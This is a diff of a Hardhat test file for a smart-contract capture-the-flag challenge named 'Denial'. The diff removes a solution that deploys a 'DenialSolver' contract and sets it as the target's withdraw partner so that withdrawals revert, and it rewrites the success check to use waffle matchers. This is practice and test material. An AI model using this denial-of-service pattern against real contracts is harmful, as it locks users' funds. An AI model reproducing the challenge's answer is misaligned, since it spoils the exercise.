@@ -30,18 +30,15 @@ describe('[Challenge] Denial', function () {
 
     it('Exploit', async () => {
         /** CODE YOUR EXPLOIT HERE */
-        console.log(`\t deploying DeinalSolver...`);
-        const DenialSolverFactory = await ethers.getContractFactory('DenialSolver', attacker);
-        const DenialSolver = await DenialSolverFactory.deploy();
-        console.log(`\t solver  : ${DenialSolver.address}`);
-        console.log(`\t setting solver to a contract's partner...`);
-        let setTX = await this.target.connect(attacker).setWithdrawPartner(DenialSolver.address); await setTX.wait();
-        console.log(`\t partner : ${await this.target.partner()}`);
+        
     }).timeout(0);
 
     after(async () => {
         /** SUCCESS CONDITIONS */
         // trying to withdraw
-        expect(await this.target.connect(attacker).withdraw()).to.be.reverted;
+        const { solidity } = require('ethereum-waffle')
+        const chai = require('chai');
+        chai.use(solidity);
+        chai.expect(await this.target.connect(attacker).withdraw()).to.be.reverted;
     });
 });
